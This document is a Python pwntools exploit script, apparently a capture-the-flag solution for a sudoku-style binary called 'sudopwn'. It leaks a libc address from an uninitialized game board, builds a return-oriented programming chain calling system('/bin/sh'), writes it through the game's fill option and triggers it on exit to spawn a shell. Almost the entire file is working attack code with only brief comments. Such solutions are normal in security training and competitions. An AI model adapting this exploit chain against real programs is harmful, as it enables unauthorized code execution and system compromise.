#!/usr/bin/env python3
from pwn import *
from functools import wraps
from ctypes import c_uint, c_int

logfunc = log.info

elf = ELF("../challenge/sudopwn")
remote_libc = ELF("../lib/libc.so.6")

if args.REMOTE:
    libc = remote_libc
else:
    libc = elf.libc

HOST, PORT = "localhost", 5004

context.binary = elf
context.terminal = ["tmux", "splitw", "-h", "-p", "75"]

# Constants

GDBSCRIPT = '''\
'''
CHECKING = True

LIBC_OFFSET = 1783559
LEAK_IDX = 14

def main():
    global io
    io = conn()

    # STEP 1: Leak libc address

    # uninitialized board leaks some address pointers
    board = show()

    # convert board to stack addresses
    a = [ c_uint(num).value for num in sum(board, [])[:-1] ]
    stack = [ (a[i+1] << 4*8) | a[i] for i in range(0, len(a), 2) ]
    buf = pack(stack[LEAK_IDX])
    libc.address = leak(buf, LIBC_OFFSET, "libc")

    # STEP 2: Write ROP chain to get shell

    roplibc = ROP(libc)
    pop_rdi = roplibc.find_gadget(["pop rdi", "ret"]).address
    ret = roplibc.find_gadget(["ret"]).address

    payload = [
        pop_rdi,
        next(libc.search(b"/bin/sh\0")),
        ret, # needed for stack alignment
        libc.sym.system,
    ]

    # convert payload to board values
    a = [ c_int(val).value for val in sum([ [val & 0xffffffff, val >> 4*8] for val in payload ], []) ]

    # write rop chain
    for i, val in enumerate(a):
        fill(9, i + 5, val)

    # exit to trigger ropchain
    sendopt(5)

    io.interactive()

def leak(buf, offset, leaktype, verbose=False):
    verbose and log.info(f"buf: {buf}")
    leak_addr = unpack(buf.ljust(context.bytes, b"\x00"))
    base_addr = leak_addr - offset
    verbose and log.info(f"{leaktype} leak: 0x{leak_addr:x}")
    log.success(f"{leaktype} base address: 0x{base_addr:x}")
    return base_addr

def stop():
    io.interactive()
    io.close()
    exit(1)

def logf(excluded=[]):
    def decorator_logf(func):
        @wraps(func)
        def wrapper_logf(*args, **kwargs):
            code = func.__code__
            varnames = [ x for x in code.co_varnames[:code.co_argcount] if x not in excluded ]
            s = ', '.join(f"{x}={{}}" for x in varnames)
            fmt = "{}({})".format(func.__name__, s)
            logfunc(fmt.format(*args, *kwargs.values()))
            return func(*args, **kwargs)
        return wrapper_logf
    return decorator_logf

def check(predicate, disabled=False):
    if not disabled and CHECKING:
        assert(predicate)

def sendopt(opt):
    io.sendlineafter("> ", f"{opt}")

def parse_board(lines):
    board = [None]*9
    regex = r' \| '.join([' '.join([r'(-?[0-9]+| )']*3)]*3)
    lines.pop(3)
    lines.pop(6)
    for i, line in enumerate(lines):
        groups = re.match(regex, line).groups()
        board[i] = [ int({' ': 0}.get(num, num)) for num in groups ]
    return board

@logf()
def fill(row, col, val):
    sendopt(1)
    io.sendlineafter(": ", f"{row}")
    io.sendlineafter(": ", f"{col}")
    io.sendlineafter(": ", f"{val}")

def randomize():
    sendopt(2)

def show():
    sendopt(3)
    io.recvline()
    lines = [ line.decode() for line in io.recvlines(11) ]
    return parse_board(lines)

def autosolve():
    sendopt(4)

def conn():
    if args.REMOTE:
        p = remote(HOST, PORT)
    elif args.GDB:
        p = gdb.debug(elf.path, gdbscript=GDBSCRIPT)
    else:
        p = process(elf.path)

    return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()
